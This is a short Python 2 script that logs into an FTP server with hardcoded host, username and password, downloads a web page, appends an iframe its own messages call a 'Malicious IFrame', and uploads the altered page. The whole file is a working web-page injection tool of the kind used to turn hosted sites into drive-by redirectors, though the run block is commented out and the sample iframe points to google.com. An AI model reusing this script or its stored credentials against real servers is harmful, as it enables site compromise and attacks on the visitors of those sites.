import ftplib

def injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    print '[+] Downloaded Page: ' + page
    f.write(redirect)
    f.close()
    print '[+] Inject Malicious IFrame on: ' + page
    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print '[+] Uploaded Inject Page: ' + page

host = 'ftp.anandcsingh.com'
user = 'todotnt'
password = 'p@ssw0rd'
'''ftp = ftplib.FTP(host)
ftp.login(user, password)
print '\n[+] FTP connected'
redirect = '<iframe src="http://google.com"></iframe>'
injectPage(ftp, 'index.htm', redirect)
ftp.quit()
   ''' 
        
